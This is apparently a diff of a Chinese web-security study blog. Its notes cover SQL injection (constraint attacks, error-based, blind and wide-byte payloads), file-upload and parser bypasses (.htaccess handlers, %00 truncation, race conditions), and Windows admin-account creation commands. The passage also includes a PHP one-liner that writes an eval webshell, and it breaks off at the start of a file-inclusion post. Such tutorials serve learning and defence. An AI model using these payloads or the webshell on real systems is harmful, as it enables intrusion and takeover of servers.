+<p>用户的一切输入都是有害的，或者说是不被信任的</p>
+<p>防御SQL注入的主要方法：</p>
+<p>对用户输入的数据进行过滤</p>
+<h1 id="sql注入漏洞挖掘"><a href="#sql注入漏洞挖掘" class="headerlink" title="sql注入漏洞挖掘"></a>sql注入漏洞挖掘</h1><p>如何从代码层面挖掘SQL注入漏洞</p>
+<p>漏洞挖掘主要可以从以下几个方面入手：</p>
+<p>代码中负责获取用户数据的变量:$_GET、$__POST、$_cookie、$_SERVER.</p>
+<p>代码中负责执行数据库查询操作的函数: mysql_query()。</p>
+<p>在代码中对这些变量和函数进行搜索跟踪，从而分析是否存在漏洞。</p>
+<p>获得网站源代码，然后对变量和函数进行搜索跟踪，来分析是否存在漏洞。</p>
+<h1 id="sql约束攻击"><a href="#sql约束攻击" class="headerlink" title="sql约束攻击"></a>sql约束攻击</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>sql语句中insert和select对长度和空格的处理方式差异造成漏洞。<br> select对参数后面的空格的处理方式是删除，insert只是取规定的最大长度的字符串。<br> 逻辑<br> 1、用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">select  ***  from table where username=&#x27;$username&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>检测输入的用户名，如果存在，说明注册过，则提示用户名已存在。<br> 2、若用户名不存在 ，那么在注册的时候用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">insert into table values(&#x27;$username&#x27;,&#x27;$password&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>将注册的用户名和密码插入数据库中。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>假设数据库中存在一个admin,而且最大的限制长度是25,我们在注册的时候输入用户名admin[20个空格]1，密码随意输入。那么数据库在判断我们注册的用户名是否存在时，使用select语句，那么空格就会被删除，剩下admin1。这时因为数据库中只有admin，所以会被注册成新用户，但在注册的时候用的是insert语句，不删除空格，只取最大字符串,那么我们实际注册的用户名就是admin[20个空格]。<br> 在登陆的时候select语句查找，以为查找的时候select回删除空格，就会返回两个admin，一条是真正的admin，另一条是admin[20个空格]，那么我们就可以用admin和我们自己的密码登录了。</p>
+<p>在SQL中执行字符串处理时，字符串末尾的空格符将会被删除。例如如下代码：</p>
+<p>SELECT userId from user where username = ‘test            ‘</p>
+<pre><code>上述代码和username = &#39;test&#39;结果是一样的。但也存在异常情况，最好的例子就是LIKE子句了。注意，对尾部空白符的这种修剪操作，主要是在“字符串比较”期间进行的。这是因为，SQL会在内部使用空格来填充字符串，以便在比较之前使其它们的长度保持一致。
+
+在所有的INSERT查询中，SQL都会根据varchar(n)来限制字符串的最大长度。也就是说，如果字符串的长度大于“n”个字符的话，那么仅插入字符串的前“n”个字符。比如特定列的长度约束为“5”个字符，那么在插入字符串“testName”时，实际上只能插入字符串的前5个字符，即“testN”。
+</code></pre>
+<p>当注册时，后台一般先select一下用户名看看是否存在，然后在insert一下。示例代码如下：</p>
+<pre><code>&lt;?php
+$username = mysql_real_escape_string($_GET[&#39;username&#39;]);
+$password = mysql_real_escape_string($_GET[&#39;password&#39;]);
+$query = &quot;SELECT *
+          FROM users
+          WHERE username=&#39;$username&#39;&quot;;
+$res = mysql_query($query, $database);
+if($res) &#123;
+  if(mysql_num_rows($res) &gt; 0) &#123;
+  &#125;
+  else &#123;
+    $query = &quot;INSERT INTO users(username, password)
+              VALUES (&#39;$username&#39;,&#39;$password&#39;)&quot;;
+</code></pre>
+<p>​    这里注册时使用用户名+【大量空格】和随机密码注册即可完成攻击。<br>​<br>​    主要原理就是insert时候有varchar(n)的限制，大于n的时候会截取前n个存入。在数据库对字符串进行比较时，即select操作，如果两个字符串的长度不一样，则会将较短的字符串末尾填充空格，使两个字符串的长度一致。注册时select语句不会将”admin+[大量空格]11”删减到n位，所以不会被select查出与admin重复，不会返回数据，接下来就可以插入admin+[空格]（截取）11和自定义密码了。<br>​    </p>
+<pre><code>如果使用用户名“vampire”和密码“random_pass”登录的话，对比时是admin与admin+[大量空格]，会将前面的admin添加空格与后面的长度相同在进行对比，那么返回的只能是我们自己注册的用户信息，而不会返回目标用户信息。SQL查询语句是一个and操作，如果密码不一样怎么会把目标用户的信息也返回回来?
+
+当登陆时使用admin与自定义密码登陆，数据库将返回我们自己注册的账户信息，但是注意此处的return $username，虽然此时查询出来的是我们自己的用户信息，但是返回的用户名则是目标的用户名。如果此后的业务逻辑直接以该用户名为准，则我们就达到了水平越权的目的。
+</code></pre>
+<h1 id="POST注入介绍"><a href="#POST注入介绍" class="headerlink" title="POST注入介绍"></a>POST注入介绍</h1><p>POST注入属于注入的一种，POST注入就是POST进行传参的注入，本质上和GET类型没有任何区别。</p>
+<p>POST注入高危点:</p>
+<ol>
+<li>登录框</li>
+<li>查询框</li>
+<li>等各种和数据库有交互的框</li>
+</ol>
+<h1 id="HEAD注入"><a href="#HEAD注入" class="headerlink" title="HEAD注入"></a>HEAD注入</h1><h2 id="PHP的超全局变量"><a href="#PHP的超全局变量" class="headerlink" title="PHP的超全局变量"></a>PHP的超全局变量</h2><p>php的全局变量是让一个脚本在全部域中可用，在调用时更加方便。</p>
+<p>$_REQUEST(获取GET/POST/COOKIE) COOKIE在新版本已经无法获取了</p>
+<p>$_POST (获取POST传参)</p>
+<p>$_GET(获取GET的传参)</p>
+<p>$_COOKIE(获取COOKIE的值)</p>
+<p>$_SERVER(包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组)</p>
+<p>常用的：</p>
+<p>$_SERVER[‘HTTP_REFERER’]获取Referer请求头数据。</p>
+<p>$_SERVER[‘HTTP_USER_AGENT’] 获取用户相关信息，包括用户浏览器，操作系统等信息。</p>
+<p>$_SERVER[‘REMOTE_ADDR’]浏览网页的用户ip。</p>
+<h2 id="updatexml-注入"><a href="#updatexml-注入" class="headerlink" title="updatexml()注入"></a>updatexml()注入</h2><p>HEAD注入一般是没有回显的，所以一般采用盲注或者报错注入【告诉你哪里错了，返回的信息里面有想要的数据】。</p>
+<p>只有致命性的报错才能让数据库爆出报错注入：</p>
+<p>比如以下函数:</p>
+<p>updatexml() 更新xml文档的函数</p>
+<p>语法:updatexml(目标xml内容，xml文档路径，更新的内容)</p>
+<p>updatexml(123,concat(0x7e,(select database())),123)</p>
+<p>updatexml()这个函数一般是配合and或者or使用的，他和联合查询不同，不需要在意什么字段数的问题。</p>
+<p>eg:</p>
+<p> select * from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1)</p>
+<p>但是要注意，and情况下只要一个为false，就会判定为false，所以如果and前面的条件不成立的情况下，就不会执行后面的语句。所以使用的时候建议使用or</p>
+<p>某些没有回显的盲注也可以通过updatexml()做出来。（因为有的报错注入的致命错误会显示出来，数据库只忽略普通报错）</p>
+<p>但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。</p>
+<h2 id="x-forwarded-for"><a href="#x-forwarded-for" class="headerlink" title="x-forwarded-for"></a>x-forwarded-for</h2><p>X-Forwarded-For(XFF)是用来识别通过HTTP代理或负载均衡方式连接到web服务器的客户端最原始的ip地址的http请求头字段。[透明代理]</p>
+<p>当今多数缓存服务器的用户为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理是透明代理，用户甚至不知道自己正在使用代理上网。那么为了获取真实ip就要用到X-Forwarded-For了。</p>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="盲注介绍"><a href="#盲注介绍" class="headerlink" title="盲注介绍"></a>盲注介绍</h2><p>盲注就是在服务器没有错误回显的时候完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的”调试信息”。</p>
+<p>布尔盲注</p>
+<p>布尔很明显Ture跟False，也就是说它只会根据你的注入信息返回Ture跟False，也就没有了之前的报错信息。</p>
+<p>时间盲注</p>
+<p>界面返回值只有一种,true无论输入任何值返回情况都会按照正常的来处理。加入特定的时间函数，通过查看web页面返回的时间差来判断注入的语句是否正确。</p>
+<h2 id="盲注需要掌握的几个函数"><a href="#盲注需要掌握的几个函数" class="headerlink" title="盲注需要掌握的几个函数"></a>盲注需要掌握的几个函数</h2><p>length() 函数，返回字符串的长度。</p>
+<p>substr(str,pos,len) 截取字符串。</p>
+<p>ascii()返回字符的ascii码</p>
+<p>sleep()将程序挂起一段时间 n为n秒</p>
+<p>if(expr1,expr2,expr3)判断语句 如果第一个语句正确则执行第二个语句 不正确则执行第三个语句</p>
+<p>猜解当前数据库名称长度:</p>
+<p><code>id=1&#39; and (length(database()))&gt;9#</code></p>
+<p>利用ASCII码猜解当前数据库名称</p>
+<p><code>and (ascii(substr(database(),1,1)))=155 --+</code>返回正常说明数据库名称第一位是s</p>
+<p><code>and(ascii(substr(database(),1,1)))=101 --+</code> 返回正常说明数据库名称第二位是e</p>
+<p>猜表名：</p>
+<p><code>and(ascii(substr((select table_name from information schema.tables where table_schema=databse() limit 0,1),1,1)))=101 --+</code> 返回正常，说明数据库表名的第一个的第一位是e。</p>
+<p>猜字段名：</p>
+<p><code>and(ascii(substr((select column_name from information_schema.columns where table_name=&#39;hello&#39; limit 0,1),1,1)))=102 --+</code> 返回正常，说明hello表中列名称的第一位是f</p>
+<p>猜内容：</p>
+<p><code>and(ascii(substr((select ff from hello limit 4,1),1,1)))=122 --+</code></p>
+<p>说明列第一位是z</p>
+<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="什么是魔术引号"><a href="#什么是魔术引号" class="headerlink" title="什么是魔术引号"></a>什么是魔术引号</h2><p>PHP的防御函数</p>
+<p>magic_quote_gpc(魔术引号开关)</p>
+<p>magic_quote_gpc函数在php中的作用是判断解析用户提交的数据，比如有：POST、GET、COOKIE过来的数据增加转义字符“\”,以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。</p>
+<p>单引号<code>&#39;</code>,双引号<code>&quot;</code>,反斜线<code>\</code>与null等字符都会被加上反斜线。</p>
+<p>如果遇到了魔术引号的话：</p>
+<ol>
+<li>寻找不需要闭合的注入点</li>
+<li>使用宽字节注入</li>
+</ol>
+<h2 id="GBK编码格式"><a href="#GBK编码格式" class="headerlink" title="GBK编码格式"></a>GBK编码格式</h2><p>尽管现在呼吁所有的程序都是用unicode编码，所有的网站都是用了utf-8编码，来一个统一的国际规范（3字节编码）。但仍然有很多，包括国内及国外（特别是非英语国家）的一些cms，仍然使用自己国家的一套编码，比如我国的gbk，作为自己默认的编码类型。</p>
+<p>GBK全称《汉字内码扩展规范》，gbk是一种多字符编码。它使用了双字节编码方案，因为双字节编码所以gbk编码汉字，占用2个字节。一个utf-8编码的汉字，占用3个字节。</p>
+<h2 id="宽字节SQL注入的原理"><a href="#宽字节SQL注入的原理" class="headerlink" title="宽字节SQL注入的原理"></a>宽字节SQL注入的原理</h2><p>宽字节SQL注入主要是源于程序员设置数据库编码为非英文编码那么就有可能产生宽字节注入。</p>
+<p>例如mysql的编码设置为了set_name’gbk’或是set character_set_client=gbk，这样配置会引发编码转换而导致的注入漏洞。</p>
+<p>宽字节sql注入就是PHP发送请求到mysql时使用了语句set names ’gbk‘ 进行了一次编码，但是又由于一些不经意的字符集转换导致了宽字节的注入。</p>
+<p>某些注入的时候，当输入库名或表名的时候因为有单引号会被转义的时候，我们只有不让它出现单引号</p>
+<ol>
+<li>利用子查询或者是函数。</li>
+</ol>
+<p>1%aa’ or 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=(select table_name from information.schema.tables where table_schema=database() limit 0,1) #</p>
+<p>这里就采用了子查询和函数结合的方式，巧妙的没有使用单引号。</p>
+<ol start="2">
+<li>MYSQL 支持16进制。</li>
+</ol>
+<p>1%aa’ or 1=1 union select 1,2,column_name from information_schema.columns where table_schema=database() and table_name=0x(…) –+</p>
+<p>这里可以把字符转换成16进制，0x表示这是16进制的标识。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/11/SQL%E6%B3%A8%E5%85%A5/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/10/11/CtfShow36D%E7%BB%83%E6%89%8B%E8%B5%9B/" class="archive-article-date">
-  	<time datetime="2021-10-11T00:46:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-10-11</time>
-</a>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-文件上传漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/10/11/CtfShow36D%E7%BB%83%E6%89%8B%E8%B5%9B/">CtfShow36D练手赛</a>
+      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">文件上传与解析漏洞</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2021-07-11T07:39:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>很多web站点都有文件上传的接口(比如注册时上传头像等)由于没有对上传的文件类型进行严格限制，导致攻击者可以上传一些恶意文件（比如Webshell）。</p>
+<p>文件上传的本质是为了让上传的文件可以任意代码执行，达到对目标的控制。（Getshell）</p>
+<h1 id="检测手段"><a href="#检测手段" class="headerlink" title="检测手段"></a>检测手段</h1><h3 id="1-客户端检测"><a href="#1-客户端检测" class="headerlink" title="1.客户端检测"></a>1.客户端检测</h3><h3 id="2-服务器检测"><a href="#2-服务器检测" class="headerlink" title="2.服务器检测"></a>2.服务器检测</h3><h3 id="3-黑白名单检测"><a href="#3-黑白名单检测" class="headerlink" title="3.黑白名单检测"></a>3.黑白名单检测</h3><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><p>常见手段：一般是在网页上写一段js脚本，用js检测，检测上传文件的后缀名，有白名单也有黑名单。</p>
+<h3 id="怎么判断是前端检测？"><a href="#怎么判断是前端检测？" class="headerlink" title="怎么判断是前端检测？"></a>怎么判断是前端检测？</h3><p>可以抓一个包来看，看一看点击上传之后，bp能否抓的到包，如果抓不到，并且弹出了不允许上传的提示，说明是进行了前端的检测。</p>
+<p>前端验证的绕过只需要抓包传正常文件就可以进行绕过。</p>
+<h2 id="黑白名单机制"><a href="#黑白名单机制" class="headerlink" title="黑白名单机制"></a>黑白名单机制</h2><ol>
+<li>黑名单：不允许上传什么</li>
+<li>白名单：只允许上传什么</li>
+<li>白名单比黑名单更安全</li>
+</ol>
+<h2 id="服务端检测"><a href="#服务端检测" class="headerlink" title="服务端检测"></a>服务端检测</h2><h3 id="几个常见的手段"><a href="#几个常见的手段" class="headerlink" title="几个常见的手段:"></a>几个常见的手段:</h3><ol>
+<li>检查Content-Type(上传的是什么类型就会是什么类型)</li>
+<li>检查后缀（检查后缀是主流）</li>
+<li>检查文件头(绕过检查文件头的主要方法是藏东西在里面)</li>
+</ol>
+<h1 id="图片马的制作"><a href="#图片马的制作" class="headerlink" title="图片马的制作"></a>图片马的制作</h1><h3 id="windows命令："><a href="#windows命令：" class="headerlink" title="windows命令："></a>windows命令：</h3><p>copy qs.jpg/b+mua.asp asp_mua.jpg</p>
+<p>qs.jpg 是图片的名字</p>
+<p>mua.asp 是木马的名字</p>
+<p>asp_mua.jpg 是图片马的名字</p>
+<h3 id="图片马的利用是有条件的："><a href="#图片马的利用是有条件的：" class="headerlink" title="图片马的利用是有条件的："></a>图片马的利用是有条件的：</h3><p>图片马的执行一定要被中间件解析。</p>
+<p>php3,.php4,.php5,.phtml 都是会被解析为php的</p>
+<h3 id="什么是中间件？"><a href="#什么是中间件？" class="headerlink" title="什么是中间件？"></a>什么是中间件？</h3><p>中间件：提供网站服务的，并且能够解析asp、php、jsp等后缀的文件。</p>
+<p>Nginx、apacha、iis等都是中间件。</p>
+<p>iis6.0漏洞:能够将cer、cdx、asa后缀的文件，统一当成asp进行解析。</p>
+<h1 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h1><p>.htaccess文件是apache服务器下的一个配置文件，其主要负责相关目录下的网页配置，即：在一个特定的文档目录中放置一个包含一个或多个指令的文件来对网页进行配置。</p>
+<p>不过需要注意的是，.htaccess文件的作用域为其所在目录与其所有的子目录，不过若是子目录也存在.htaccess文件，则会覆盖父目录的.htaccess效果。</p>
+<p>一个htaccess实例文件如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;ifModule mime_module&gt;</span><br><span class="line"></span><br><span class="line">AddHandler php5-script .jpg</span><br><span class="line">&lt;!-- 将.jpg文件按照php代码进行解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">&lt;!-- 将.jpg文件按照php代码进行解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">&lt;!-- 将该目录及子目录下的文件均按照php文件解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/ifModule&gt;</span><br><span class="line">&lt;!-- 该种匹配方式并不推荐，极易造成误伤 --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;muma.jpg&quot;&gt;</span><br><span class="line"></span><br><span class="line">Sethandler application/x-httpd-php</span><br><span class="line">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">Addhandler php5-script .jpg</span><br><span class="line">&lt;!-- 将匹配到的 muma.jpg 文件按照php解析执行 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;!-- 该种匹配方式较为精准，不会造成大批的误伤情况 --&gt;</span><br></pre></td></tr></table></figure>
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+
+
+<p>Sethandler：</p>
+<p>将该目录以及子目录的所有文件均解析为php文件类型。</p>
+<p>Addhandler：</p>
+<p>使用php5-script 处理器来解析所匹配到的文件。</p>
+<p>addtype指令</p>
+<p>将特定扩展名文件映射为php文件类型</p>
+<p>.htaccess上传漏洞形成条件:</p>
+<ol>
+<li>apache服务器</li>
+<li>能够上传.htaccess文件，一般为黑名单限制</li>
+<li>AllowOverRide all，默认配置为none</li>
+<li>LoadModule rewrite_module modules/mod_rewrite.so #模块为开启状态</li>
+<li>上传目录具有可执行权限。</li>
+</ol>
+<h1 id="windows系统中一些文件上传漏洞的特性"><a href="#windows系统中一些文件上传漏洞的特性" class="headerlink" title="windows系统中一些文件上传漏洞的特性"></a>windows系统中一些文件上传漏洞的特性</h1><h2 id="DATA"><a href="#DATA" class="headerlink" title="::$DATA"></a>::$DATA</h2><p>在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持::$DATA之前的文件名，它的目的就是不检查后缀名。</p>
+<p>例如：<code>phpinfo.php::$DATA</code> windows会自动去掉末尾的::$DATA变成<code>phpinfo.php</code></p>
+<h2 id="文件后缀加空格或者加点"><a href="#文件后缀加空格或者加点" class="headerlink" title="文件后缀加空格或者加点"></a>文件后缀加空格或者加点</h2><p>windows系统中在创建后缀加空格或者加点的文件都会自动取消。</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>提权属于后渗透的部分，需要授权。</p>
+<p>web容器（web中间件）权限</p>
+<p>原因：我们上传的木马是被中间件解析的，所以中间件是什么权限，我们就是什么权限。</p>
+<p>遇到连命令都无法执行的情况，我们可以上传一个cmd.exe（windwos系统）</p>
+<p>针对windows+iis6.0的提权：</p>
+<p>可以上传一个iis6.exe的提权软件。</p>
+<p>关于用户的命令：</p>
+<p>net user qiesi abc123 /add：添加用户 账户名：</p>
+<p>net user qiesi /delete :删除用户</p>
+<p>初次生成的账号是一个普通账号，普通账号没有远程登录服务器的权限。</p>
+<p>将用户添加进管理员组：</p>
+<p>net localgroup administrators qiesi /add:加入到管理员组</p>
+<h1 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h1><h2 id="php文件上传流程"><a href="#php文件上传流程" class="headerlink" title="php文件上传流程:"></a>php文件上传流程:</h2><ol>
+<li>上传到临时文件目录</li>
+<li>拼接要移动到的目录</li>
+<li>移动过去重命名（注意这个重命名过程，是我们注入得关键）</li>
+</ol>
+<h2 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h2><p>假如我们要移动1.php到目录<code>/upload/</code>，服务器白名单不允许上传php，只准允许jpg等格式。我们可以更改我们的上传路径为<code>/upload/1.php%00/....</code>我们的文件名在移动过去重命名的阶段时，因为编译器读到了%00，会认为程序终止，最终构造到<code>/upload/1.php</code>就停止了所以就可以上传造成文件上传漏洞。</p>
+<p>%00是URL编码后的东西。（URL编码其实是就是为了表示16进制。）</p>
+<p>Get传参会有URL解码，post传参正常不会有URL解码。</p>
+<p>所有在post传参得时候，我们可以通过修改post数据包中得二进制来做00截断修改。</p>
+<h1 id="gif图片攻击二次渲染"><a href="#gif图片攻击二次渲染" class="headerlink" title="gif图片攻击二次渲染"></a>gif图片攻击二次渲染</h1><p>二次渲染是指服务器会对上传的图片作出一些十六进制的改动。</p>
+<p>面对二次渲染我们是通过gif图片（gif在经过二次渲染的时候，不会有太大的改变。），往里面加一句话木马来进行。</p>
+<h1 id="条件竞争绕过"><a href="#条件竞争绕过" class="headerlink" title="条件竞争绕过"></a>条件竞争绕过</h1><p>条件竞争是为了对付服务器先上传文件，然后检测，删除的情况。</p>
+<h2 id="什么是条件竞争"><a href="#什么是条件竞争" class="headerlink" title="什么是条件竞争"></a>什么是条件竞争</h2><p>条件竞争发生在多个线程同时访问同一个共享代码、变量、文件等没有进行锁操作或者同步操作的场景中。</p>
+<p>一般而言我们是上传了文件，上传了但是最后却因为函数过滤或者其他原因被删除了，那么我们可以使用条件竞争，我们实际上是和unlink，是和删除文件的函数进行竞争。</p>
+<p>假如我不断的上传发包，然后我同时也不断的访问那个我们上传上去的文件的地址，我们就开始和服务器的函数比手速了，函数执行都是要时间的，如果我这边上传上去，且没有删除，那个时间可能很短，然后被我访问到了，岂不是就可以执行PHP了<del>我就比服务器手速快了</del></p>
+<p>你可以上传一个php然后访问后，由这个php去写一个马</p>
+<?php $a = '<?php @eval($_REQUEST[\'a\'])?><p>‘;file_put_contents(‘1.php’,$a)?&gt;</p>
+<h1 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h1><p><strong>解析漏洞正如其名，一般大家常说的是，文件在某种格式下，会被执行为该脚本语言的文件。</strong></p>
+<p>ISS他是个中间件/容器可以搭建各种语言。容器的作用是检测扩展名，然后交给了可执行文件处理。</p>
+<h2 id="IIS6-0畸形解析漏洞（只影响IIS6-0这个版本）"><a href="#IIS6-0畸形解析漏洞（只影响IIS6-0这个版本）" class="headerlink" title="IIS6.0畸形解析漏洞（只影响IIS6.0这个版本）"></a>IIS6.0畸形解析漏洞（只影响IIS6.0这个版本）</h2><ol>
+<li><p>asa cdx cer 都会被当作asp解析。【默认设置】</p>
+</li>
+<li><p>ISS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。这一漏洞有两种完全不同的利用方式:</p>
+<p>test.asp;.jpg 它当作asp进行解析。</p>
+<p>test.asp/123.jpg 他当做asp进行解析。</p>
+</li>
+<li><p>文件夹名字如果是x.asp那么这个文件夹下任意文件都当作asp执行。</p>
+</li>
+</ol>
+<h2 id="CGI解析漏洞"><a href="#CGI解析漏洞" class="headerlink" title="CGI解析漏洞"></a>CGI解析漏洞</h2><p>适用范围：PHP</p>
+<p>中间件任意：Iis7.5，Nginx，lighttpd等web容器中也经常会出现这样的解析漏洞。</p>
+<p>在默认Fast-CGI开启状况下,上传一个名字为1.jpg，访问时候1.jpg/.php会以php来解析。</p>
+<p>IIS和Nginx在这一点上是一样的，一看到URL中文件后缀是.php，便无论该文件是否存在，都直接交给php处理，而php又默认开启“cgi.fix_pathinfo”，会对文件路径进行“修理”，何谓“修理”？举个例子，当php遇到文件路径“/aaa.xxx/bbb.yyy/ccc.zzz”时，若“/aaa.xxx/bbb.yyy/ccc.zzz”不存在，则会去掉最后的“/ccc.zzz”，然后判断“/aaa.xxx/bbb.yyy”是否存在，若存在，则把“/aaa.xxx/bbb.yyy”当做文件“/aaa.xxx/bbb.yyy/ccc.zzz”，若“/aaa.xxx/bbb.yyy”仍不存在，则继续去掉“/bbb.yyy”，以此类推。</p>
+<p>若有文件test.jpg，访问时在其后加/.php，便可以让IIS把“test.jpg/.php”交给php，php“修理”文件路径“test.jpg/.php”得到“test.jpg”。</p>
+<h2 id="nginx-lt-8-03空字节代码执行漏洞"><a href="#nginx-lt-8-03空字节代码执行漏洞" class="headerlink" title="nginx&lt;8.03空字节代码执行漏洞"></a>nginx&lt;8.03空字节代码执行漏洞</h2><p>Xxx.jpg%00.php该文件会被当做脚本文件php执行。这个漏洞是CGI漏洞的一个关联。</p>
+<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><p>Apache是从右到左开始判断解析，如果为不可识别解析，就在往左边读。</p>
+<p>例如v01cano.php.zzz，后缀名zzz是apache做不能识别的文件后缀名，则继续向左读取，直到读取到了php,apache能够识别，则该文件就被解析成为了php类型的文件。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/07/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
   
+    <article id="post-文件包含漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
-    </div></section>
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a>
+    </h1>
   
 
+        
+        <a href="/2021/07/11/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="archive-article-date">
+  	<time datetime="2021-07-11T02:38:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-11</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>程序开发人员通常会把可重复使用的函数写入到单个文件中，在使用某些函数时，直接调用此文件，而无需再次编写，这种调用文件的过程称为包含。相同代码重复出现在不同文件中出现代码冗余，所以出现了文件包含函数，就是让代码更为高效，需要用到的部分会去调用，且被包含的文件会被当作php代码执行（文件里面的东西是必须当作代码执行，文件包含，只要包含了，不管任何后缀，都会当作php代码执行）。</p>
+<p>有时候用于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就会导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
+<h2 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h2><ol>
+<li>本地文件包含，包含服务器上的资源。</li>
